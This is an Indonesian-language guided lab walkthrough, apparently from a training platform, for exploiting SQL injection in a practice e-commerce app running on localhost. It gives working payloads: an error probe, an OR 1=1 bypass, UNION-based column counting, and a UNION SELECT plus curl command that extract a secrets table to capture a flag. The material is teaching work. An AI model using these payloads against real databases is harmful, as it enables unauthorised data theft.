# Panduan Praktik Terbimbing: Eksploitasi SQL Injection pada MegaStore Global

Dalam latihan terarah ini, Anda akan mempraktikkan proses audit dan eksploitasi kerentanan SQL Injection pada portal katalog produk **MegaStore Global (Commercial E-Commerce & Retail Inventory Portal)** pada `http://127.0.0.1:8015`.

---

### Tahap 1: Pengujian Input & Deteksi Error SQL
1. Buka peramban web dan akses halaman katalog:
   `http://127.0.0.1:8015/`
2. Pada kotak pencarian produk, masukkan karakter kutip tunggal:
   `'`
3. Klik tombol **"Search Inventory"**.
4. **Temuan Bukti:**
   - Server menampilkan kotak peringatan:
     `Internal Database Exception: unrecognized token: "'%'"`
   - Respons ini memastikan bahwa karakter input Anda berhasil memecah batas sintaks query SQL backend.

---

### Tahap 2: Menyeimbangkan Query & Mengukur Jumlah Kolom
1. Uji penutupan string dan netralisasi sisa query dengan karakter komentar:
   `' OR 1=1 --`
   - Amati bahwa seluruh daftar produk ditampilkan tanpa memicu pesan error.
2. Identifikasi jumlah kolom yang diekspektasikan oleh query asli:
   - Query backend meminta 3 kolom: `name`, `category`, `price`.
   - Uji payload UNION:
     `' UNION SELECT 'a', 'b', 1 --`
   - Amati bahwa baris baru dengan nama `a`, kategori `b`, dan harga `$1.00` berhasil diinjeksi ke dalam tabel antarmuka.

---

### Tahap 3: Eksfiltrasi Data Rahasia dari Tabel `vault_secrets`
1. Lakukan ekstraksi data dari tabel rahasia `vault_secrets`:
   `' UNION SELECT secret_name, secret_data, 0 FROM vault_secrets --`
2. Masukkan payload di atas ke dalam kolom pencarian atau kirimkan via cURL:
   ```bash
   curl -s -G "http://127.0.0.1:8015/" --data-urlencode "q=' UNION SELECT secret_name, secret_data, 0 FROM vault_secrets --"
   ```
3. **Temuan Kunci:**
   - Baris tabel produk kini menampilkan:
     - **Product Name:** `PROJECT_ZITERA_CORE_FLAG`
     - **Category:** `FLAG: ZITERA{...}`
4. Salin bukti flag berformat `ZITERA{...}` dan kirimkan ke Zitera Lab desktop untuk menyelesaikan modul ini!
